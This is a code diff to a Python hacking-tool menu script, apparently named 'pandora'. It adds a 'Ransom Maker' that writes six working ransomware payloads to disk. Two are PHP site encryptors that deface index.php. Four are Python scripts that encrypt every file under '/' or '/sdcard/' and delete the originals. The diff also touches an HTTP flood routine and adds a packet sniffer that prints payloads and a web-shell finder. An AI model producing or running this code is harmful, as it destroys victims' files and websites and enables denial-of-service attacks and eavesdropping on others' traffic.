@@ -107,8 +107,366 @@ blue = '\033[1;34m'
 red_t = '\033[0;31;40m'
 gray = '\033[1;37;40m'
 
-package_name = "adafruit"
+def ransomware1(name, tdir, sa):
+    func = """
+    {
+        $key = "\x00\x20\x02\x20\x00\x10\x22\x01\xe0"; // Replace with your own secret key
+        $encryptedContent = openssl_encrypt(file_get_contents($file), "AES-256-CBC", $key, 0, substr($key, 0, 16));
+        file_put_contents($file, $encryptedContent);
+    }
 
+    function encryptDirectory($dir) {
+        $dirContent = scandir($dir);
+
+        foreach ($dirContent as $entry) {
+            if ($entry !== "." && $entry !== "..") {
+                $entryPath = $dir . "/" . $entry;
+
+                if (is_dir($entryPath)) {
+                    encryptDirectory($entryPath);
+                } else {
+                    encryptFile($entryPath);
+                }
+            }
+        }
+    }
+    """
+    ransomware1 = f"""
+    <?php
+    function encryptFile($file) {func}
+
+    $message = "Encrypted By {name} !";
+    $targetDir = "{tdir}";
+
+    encryptDirectory($targetDir);
+
+    // Create a ransom note file
+    $ransomNote = $targetDir . "/RansomNote.txt";
+    file_put_contents($ransomNote, $message);
+
+    echo "All files in the directory " . $targetDir . " have been encrypted By {name}";
+
+    ?>
+    """
+    target_directory = 'Ransomware'
+    file_name = sa+'.php'
+
+    path = os.path.join(target_directory, file_name)
+    def startloggingransomware1(path, ransomware1, sa):
+        with open(path, "a") as file:
+            file.write(str(ransomware1))
+            file.close()
+            print("Saved As : {}.php in dir : {}".format(sa, f'pandora/Ransomware/{sa}.php'))
+    startloggingransomware1(path, ransomware1, sa)
+    return ransomware1
+def ransomware2(name, sa):
+    func = """
+    {
+        $fileContent = file_get_contents($fileName);
+        $encryptedContent = openssl_encrypt($fileContent, 'AES-256-CBC', $encryptionKey, 0, 'FuckY0URS1T3');
+        file_put_contents($fileName, $encryptedContent);
+    }
+
+    // Encrypt all files in a directory
+    function encryptDirectory($dir, $encryptionKey) {
+        $files = scandir($dir);
+        foreach($files as $file) {
+            $filePath = $dir . '/' . $file;
+            if(is_file($filePath)) {
+                encryptFile($filePath, $encryptionKey);
+            } elseif($file != '.' && $file != '..' && is_dir($filePath)) {
+                encryptDirectory($filePath, $encryptionKey);
+            }
+        }
+    }
+
+    // Function to create glitch effect on text
+    function glitchText($text) {
+        $glitchedText = '';
+        for ($i = 0; $i < strlen($text); $i++) {
+            $glitchedText .= '<span style="color: white; text-shadow: 0 0 2px #00FFFF, 0 0 5px #00FFFF, 0 0 10px #00FFFF, 0 0 20px #00FFFF, 0 0 30px #00FFFF, 0 0 40px #00FFFF, 0 0 55px #00FFFF, 0 0 75px #00FFFF;">' . $text[$i] . '</span>';
+        }
+        return $glitchedText;
+    }
+    """
+    glitvh = f"$glitchedText = glitchText('404 Encrypted By {name}');"
+    shape1= '{'
+    shape2= '}'
+    func2 = f"""
+    {shape1}
+        // Encrypt files in current directory
+        encryptDirectory('.', $encryptionKey);
+        
+        // Create glitched HTML message
+        {glitvh}
+        $htmlMessage = "<html><head><style>@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');</style></head><body style='background: linear-gradient(to right, blue, cyan);'><h1 style='font-family: Roboto, sans-serif; color: white; text-align: center;'>$glitchedText</h1><h2 style='font-family: Roboto, sans-serif; color: white; text-align: center;'>Wh00pz, It's encrypted! Enjoy the new site !</h2></body></html>";
+        
+        // Write HTML message to a file
+        file_put_contents('index.php', $htmlMessage);
+        
+        echo "Wh00pz!, Encrypted By {sa}, Enjoy your new SITE!'.";
+    {shape2}
+    """
+    mainransom = f"""
+    // Main ransomware function
+    function ransomware($encryptionKey) {func2}
+
+    // Call the ransomware function
+    ransomware($encryptionKey);
+
+    ?>
+    """
+    ransomware2 = f"""
+    <?php
+
+    // Ransomware PHP script to encrypt files with a cool HTML message including a glitch effect
+    // Disclaimer: This script is for educational purposes only and should not be used for malicious intent.
+
+    $encryptionKey = "zxcvbnm1234567890asdfghjklzxcvbnmqwertyuiop"; // Change this to your desired encryption key
+    {func}
+    // Function to encrypt a file
+    function encryptFile($fileName, $encryptionKey) {mainransom}
+    """
+    
+    target_directory = 'Ransomware'
+    file_name = sa+'.php'
+
+    path = os.path.join(target_directory, file_name)
+    def startloggingransomware2(path, ransomware2, sa):
+        with open(path, "a") as file:
+            file.write(str(ransomware2))
+            file.close()
+            print("Saved As : {}.php in dir : {}".format(sa, f'pandora/Ransomware/{sa}.php'))
+    startloggingransomware2(path, ransomware2, sa)
+    return ransomware2
+def ransomware3(name, sa):
+    ransomware3 = f"""
+    import os
+    import sys
+    import base64
+    from Crypto.Cipher import AES
+
+    def encrypt_file(filename, key):
+        chunk_size = 64 * 1024
+        output_filename = filename + ".lockedby{name}"
+
+        try:
+            with open(filename, 'rb') as file:
+                data = file.read()
+
+            cipher = AES.new(key, AES.MODE_ECB)
+            encrypted_data = cipher.encrypt(pad_data(data))
+
+            with open(output_filename, 'wb') as file:
+                file.write(base64.b64encode(encrypted_data))
+
+            os.remove(filename)
+            print("File locked: " + filename)
+            print("Encrypted file: " + output_filename)
+
+        except Exception as e:
+            print("Error: " + str(e))
+            pass
+
+    def pad_data(data):
+        padding_size = AES.block_size - (len(data) % AES.block_size)
+        return data + (chr(padding_size) * padding_size).encode()
+
+    if __name__ == "__main__":
+        key = b'SuperSecretKey123' # Change this with your desired encryption key
+
+        # Enter the directory path you want to encrypt
+        directory_path = '/'
+
+        for root, dirs, files in os.walk(directory_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                encrypt_file(file_path, key)
+
+    print("All files encrypted successfully!")
+    """
+    target_directory = 'Ransomware'
+    file_name = sa+'.py'
+
+    path = os.path.join(target_directory, file_name)
+    def startloggingransomware3(path, ransomware3, sa):
+        with open(path, "a") as file:
+            file.write(str(ransomware3))
+            file.close()
+            print("Saved As : {}.py in dir : {}".format(sa, f'pandora/Ransomware/{sa}.py'))
+    startloggingransomware3(path, ransomware3, sa)
+    return ransomware3
+def ransomware4(sa):
+    ransomware4 = """
+    import os
+    from cryptography.fernet import Fernet
+
+    def encrypt_file(key, path):
+        try:
+            with open(path, 'rb+') as file:
+                file_data = file.read()
+                cipher = Fernet(key)
+                encrypted_data = cipher.encrypt(file_data)
+
+                file.seek(0)
+                file.write(encrypted_data)
+                file.truncate()
+            return True
+        except:
+            return False
+
+    def lock_android_files():
+        key = Fernet.generate_key()
+        files = []
+
+        # Specify the directory to target for encryption
+        target_directory = '/sdcard/'
+
+        # Walk through the directory and find all files
+        for root, _, filenames in os.walk(target_directory):
+            for filename in filenames:
+                file_path = os.path.join(root, filename)
+                files.append(file_path)
+
+        for file in files:
+            if encrypt_file(key, file):
+                print(f"Successfully encrypted: {file}")
+            else:
+                print(f"Failed to encrypt: {file}")
+
+        # Display a message on the device screen
+        message_file = '/sdcard/ransomware_message.txt'
+        message = "Locked By Ransomware"
+
+        if encrypt_file(key, message_file):
+            with open(message_file, 'w') as file:
+                file.write(message)
+            print("Message file encrypted successfully")
+        else:
+            print("Failed to encrypt message file")
+
+    lock_android_files()
+    """
+    target_directory = 'Ransomware'
+    file_name = sa+'.py'
+
+    path = os.path.join(target_directory, file_name)
+    def startloggingransomware4(path, ransomware4, sa):
+        with open(path, "a") as file:
+            file.write(str(ransomware4))
+            file.close()
+            print("Saved As : {}.py in dir : {}".format(sa, f'pandora/Ransomware/{sa}.py'))
+    startloggingransomware4(path, ransomware4, sa)
+    return ransomware4
+def ransomware5(name, sa):
+    ransomware5 = f"""
+    import os
+    import shutil
+    import getpass
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad
+    import base64
+
+    # Get the secret key for encryption
+    password = 'Y0URM0MM41SG01N9T0B33XPL0D3D!H4HaHaAHA'
+
+    def encrypt_file(file_path):
+        try:
+            # Open the input file
+            with open(file_path, 'rb') as file:
+                file_data = file.read()
+
+            # Initialize the cipher with the secret key and AES mode
+            cipher = AES.new(pad(password.encode(), AES.block_size), AES.MODE_ECB)
+
+            # Encrypt the file data and base64 encode it
+            encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
+            encrypted_data = base64.b64encode(encrypted_data)
+
+            # Write the encrypted data back to the file
+            with open(file_path, 'wb') as file:
+                file.write(encrypted_data)
+
+        except:
+            pass
+
+    # Get all files in the system
+    file_list = []
+    for dirpath, dirnames, filenames in os.walk('/'):
+        for file in filenames:
+            file_list.append(os.path.join(dirpath, file))
+
+    # Encrypt each file in the system
+    for file in file_list:
+        encrypt_file(file)
+
+    # Display the ransom message
+    print("Locked By {name} Ransomware")
+    """
+    target_directory = 'Ransomware'
+    file_name = sa+'.py'
+
+    path = os.path.join(target_directory, file_name)
+    def startloggingransomware5(path, ransomware5, sa):
+        with open(path, "a") as file:
+            file.write(str(ransomware5))
+            file.close()
+            print("Saved As : {}.py in dir : {}".format(sa, f'pandora/Ransomware/{sa}.py'))
+    startloggingransomware5(path, ransomware5, sa)
+    return ransomware5
+def ransomware6(name, sa):
+    ransomware6 = f"""
+    import os
+    import random
+    from cryptography.fernet import Fernet
+
+    def generate_key():
+        key = Fernet.generate_key()
+        with open('key.key', 'wb') as key_file:
+            key_file.write(key)
+
+    def encrypt_file(file_path, key):
+        with open(file_path, 'rb') as file:
+            data = file.read()
+
+        f = Fernet(key)
+        encrypted_data = f.encrypt(data)
+
+        with open(file_path, 'wb') as encrypted_file:
+            encrypted_file.write(encrypted_data)
+
+        os.remove(file_path)  # remove the original file
+
+    def lock_files(start_directory, key):
+        for root, _, files in os.walk(start_directory):
+            for file in files:
+                file_path = os.path.join(root, file)
+                encrypt_file(file_path, key)
+
+        # Create a text file with the ransom message
+        with open('message.txt', 'w') as message_file:
+            message_file.write('Locked By {name} Ransomware')
+
+        # Encrypt the ransom message file
+        encrypt_file('message.txt', key)
+
+    generate_key()
+    key = open('key.key', 'rb').read()
+
+    lock_files('/', key)
+    """
+    target_directory = 'Ransomware'
+    file_name = sa+'.py'
+
+    path = os.path.join(target_directory, file_name)
+    def startloggingransomware6(path, ransomware6, sa):
+        with open(path, "a") as file:
+            file.write(str(ransomware6))
+            file.close()
+            print("Saved As : {}.py in dir : {}".format(sa, f'pandora/Ransomware/{sa}.py'))
+    startloggingransomware6(path, ransomware6, sa)
+    return ransomware6
+package_name = "adafruit"
 try:
     pass
 except ImportError or ModuleNotFoundError:
@@ -132,7 +490,7 @@ def ddos20():
     {yellow}│{blue} [05] DNS FLOOD                                                                                  {yellow}│{blue}
     {yellow}│{blue} [06] SYN FLOOD                                                                                  {yellow}│{blue}
     {yellow}│{blue} [07] Network Monitor {red}[Real Hot]{blue}                                                                 {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [08] Network Sniffs2 {red}[Real Hot]{blue}                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
@@ -147,7 +505,7 @@ def m2():
     {yellow}│{blue} [01] InsomniaGPT X Crack {red}[Hot AF]{blue}                                                               {yellow}│{blue}
     {yellow}│{blue} [02] DDOS {red}[Hot AF]{blue}                                                                              {yellow}│{blue}
     {yellow}│{blue} [03] Shell Finder                                                                               {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [04] {green}Ransom Maker V1                                                                            {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
@@ -4140,7 +4498,7 @@ elif answer == ("20"):
                 thrd = input("Threads : ")
                 def startshttp():
                     http.connect((ip,port))
-                    http.send("GET / HTTP/1.1\r\nHost: {}\r\nContent-Length : 100\r\n".format(ip))
+                    http.sendto((f"GET / HTTP/1.1\r\nHost: {ip}\r\nContent-Length : 100\r\n").encode('utf-8'), (ip,port))
                     http.close()
                 for i in range(int(thrd)):
                     t = threading.Thread(target=startshttp)
@@ -4392,6 +4750,48 @@ elif answer == ("20"):
                             continue
                 # Start monitoring network
                 monitor_network()
+            elif answer == '8':
+                print("Monitoring.. \n")
+                def spy_network_activities():
+                    while True:
+                        packets = sniff(count=1)
+
+                        for packet in packets:
+                            try:
+                                # Extracting packet details
+                                packet_info = f"Packet: {packet.summary()}"
+                                header_info = f"Header: {packet[IP].src} -> {packet[IP].dst}"
+                                length_info = f"Length: {len(packet)}\n"
+                                source_ip_info = f"Source IP: {packet[IP].src}"
+                                destination_ip_info = f"Destination IP: {packet[IP].dst}"
+                                end_info = f"End: {packet[TCP].flags}"
+                                buffer_info = f"Buffer: {packet[IP].payload}"
+                                payload_info = f"Payload: {packet[IP].payload.load}"
+                                host_domain_info = f"Host Domain: {packet[IP].dst}"
+                                ip_domain_info = f"IP Domain: {packet[IP].dst}"
+                                protocol_type_info = f"Protocol Type: {packet[IP].proto}"
+
+                                # Printing packet details
+                                print(packet_info)
+                                print(header_info)
+                                print(length_info)
+                                print(source_ip_info)
+                                print(destination_ip_info)
+                                print(end_info)
+                                print(buffer_info)
+                                print(payload_info)
+                                print(host_domain_info)
+                                print(ip_domain_info)
+                                print(protocol_type_info)
+                                print("\n")
+                            except:
+                                continue
+
+                        time.sleep(0.9)
+
+                spy_network_activities()
+            else:
+                exit()
         elif answer == '3':
             def search_shell(site_target):
                 sj = input("Add Shells Name To Search [Example : IndoXploit.php,Mini.php,Admin.php ]: ")
@@ -4404,28 +4804,96 @@ elif answer == ("20"):
                 soup = BeautifulSoup(response.content, 'html.parser')
 
                 for shell in shells:
-                    result = soup.find('a', href=shell)
-                    for results in search(f"site:{site_target} inurl:{shell}", num=int(1), start=0, stop=None, pause=2):
-                        try:
+                    print("\n\033[0m[~] Searching For : ", shell)
+                    try:
+                        result = soup.find('a', href=shell)
+                        for results in search(f"site:{site_target} inurl:{shell}", num=int(1), start=0, stop=None, pause=2):
+                            try:
+                                if results:
+                                    results = results
+                            except:
+                                continue
+                        if site_target.lower() == 'http':
+                            pass
+                            if result:
+                                shell_name = result['href']
+                                shell_size = result['size']
+
+                                shell_details = soup.find('div', class_='details')
+                                injected_on = shell_details.find('span', class_='injected-on').text if shell_details else 'None'
+
+                                print(f"Shell Name: {shell_name}")
+                                print(f"Size: {shell_size}")
+                                print(f"Injected On: {injected_on}")
+                                print(f"Site: {site_target}")
+                        else:
+                            pass
                             if results:
-                                results = results
-                        except:
-                            continue
-                    if result:
-                        shell_name = result['href']
-                        shell_size = result['size']
-
-                        shell_details = soup.find('div', class_='details')
-                        injected_on = shell_details.find('span', class_='injected-on').text if shell_details else 'None'
-
-                        print(f"Shell Name: {shell_name}")
-                        print(f"Size: {shell_size}")
-                        print(f"Injected On: {injected_on}")
-                        print(f"Site: {site_target}")
-                    elif results:
-                        print('\n[~] Shells In {} :'.format(site_target), results, '\n')
+                                print('\n[~] Shells In {} :'.format(site_target), results, '\n')
+                    except:
+                        continue
             site_target = input("Enter the target URL: ")
             search_shell(site_target)
+        elif answer == '4':
+            pass
+            if os.name == "posix":
+                os.system('clear')
+            elif os.name == "nt":
+                os.system('cls')
+            print(f"{red_t}██████{gray}╗  {red_t}█████{gray}╗ {red_t}███{gray}╗   {red_t}██{gray}╗{red_t}███████{gray}╗ {red_t}██████{gray}╗ {red_t}███{gray}╗   {red_t}███{gray}╗ {red_t}█████{gray}╗ {red_t}██{gray}╗  {red_t}██{gray}╗{red_t}███████{gray}╗{red_t}██████{gray}╗ ")
+            print(f"{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}████{gray}╗  {red_t}██{gray}║{red_t}██{gray}╔════╝{red_t}██{gray}╔═══{red_t}██{gray}╗{red_t}████{gray}╗ {red_t}████{gray}║{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}║ {red_t}██{gray}╔╝{red_t}██{gray}╔════╝{red_t}██{gray}╔══{red_t}██{gray}╗")
+            print(f"{red_t}██████{gray}╔╝{red_t}███████{gray}║{red_t}██{gray}╔{red_t}██{gray}╗ {red_t}██{gray}║{red_t}███████{gray}╗{red_t}██{gray}║   {red_t}██{gray}║{red_t}██{gray}╔{red_t}████{gray}╔{red_t}██{gray}║{red_t}███████{gray}║{red_t}█████{gray}╔╝ {red_t}█████{gray}╗  {red_t}██████{gray}╔╝")
+            print(f"{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔══{red_t}██{gray}║{red_t}██{gray}║╚{red_t}██{gray}╗{red_t}██{gray}║╚════{red_t}██{gray}║{red_t}██{gray}║   {red_t}██{gray}║{red_t}██{gray}║╚{red_t}██{gray}╔╝{red_t}██{gray}║{red_t}██{gray}╔══{red_t}██{gray}║{red_t}██{gray}╔═{red_t}██{gray}╗ {red_t}██{gray}╔══╝  {red_t}██{gray}╔══{red_t}██{gray}╗")
+            print(f"{red_t}██{gray}║  {red_t}██{gray}║{red_t}██{gray}║  {red_t}██{gray}║{red_t}██{gray}║ ╚{red_t}████{gray}║{red_t}███████{gray}║╚{red_t}██████{gray}╔╝{red_t}██{gray}║ ╚═╝ {red_t}██{gray}║{red_t}██{gray}║  {red_t}██{gray}║{red_t}██{gray}║  {red_t}██{gray}╗{red_t}███████{gray}╗{red_t}██{gray}║  {red_t}██{gray}║")
+            print(f"{gray}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝")
+            print('')
+            print(f"{red_t}╔═══════════════════════════════════════╗")
+            print(f"{red_t}╟ {gray}1. Ransom Site  1{red_t}                     ║")
+            print(f"{red_t}╟ {gray}2. Ransom Site  2{red_t}                     ║")
+            print(f"{red_t}╟ {gray}3. Ransom phone 3{red_t}                     ║")
+            print(f"{red_t}╟ {gray}4. Ransom phone 4{red_t}                     ║")
+            print(f"{red_t}╟ {gray}5. PC Ransom    5{red_t}                     ║")
+            print(f"{red_t}╟ {gray}6. PC Ransom    6{red_t}                     ║")
+            print(f"{red_t}╚═══════════════════════════════════════╝")
+            choice = input(f"Choice : ")
+            try:
+                os.mkdir('Ransomware')
+            except FileExistsError:
+                pass
+            if choice == '1':
+                pass
+                name = input("Enter your cyber name : ")
+                tdir = input("Target Dir [Ex : /home/user/public_html/] : ")
+                sa = input("Save AS [ex : ransomware1, ransomware2] : ")
+                ransomware1(name, tdir, sa)
+            if choice == '2':
+                pass
+                name = input("Enter your cyber name : ")
+                sa = input("Save AS [ex : ransomware1, ransomware2] : ")
+                ransomware2(name, sa)
+            if choice == '3':
+                pass
+                name = input("Enter your cyber name : ")
+                sa = input("Save AS [ex : ransomware1, ransomware2] : ")
+                ransomware3(name, sa)
+            if choice == '4':
+                pass
+                name = input("Enter your cyber name : ")
+                sa = input("Save AS [ex : ransomware1, ransomware2] : ")
+                ransomware4(sa)
+            if choice == '5':
+                pass
+                name = input("Enter your cyber name : ")
+                sa = input("Save AS [ex : ransomware1, ransomware2] : ")
+                ransomware5(name, sa)
+            if choice == '6':
+                pass
+                name = input("Enter your cyber name : ")
+                sa = input("Save AS [ex : ransomware1, ransomware2] : ")
+                ransomware6(name, sa)
+        else:
+            print(green + f"Exit..")
+            exit()
     else:
         print(green + f"Exit..")
         exit()
